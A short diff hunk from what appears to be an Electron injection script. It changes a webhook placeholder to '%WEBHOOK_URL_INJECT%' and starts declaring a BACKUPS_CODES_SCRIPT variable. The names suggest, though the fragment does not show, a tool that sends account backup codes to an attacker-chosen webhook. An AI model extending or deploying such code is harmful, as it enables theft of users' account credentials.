@@ -6,7 +6,7 @@ const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
     https = require("https"),
     path = require("path");
 
-let WEBHOOK = "%WEBHOOK_URL%";
+let WEBHOOK = "%WEBHOOK_URL_INJECT%";
 
 let [
     BACKUPS_CODES_SCRIPT,
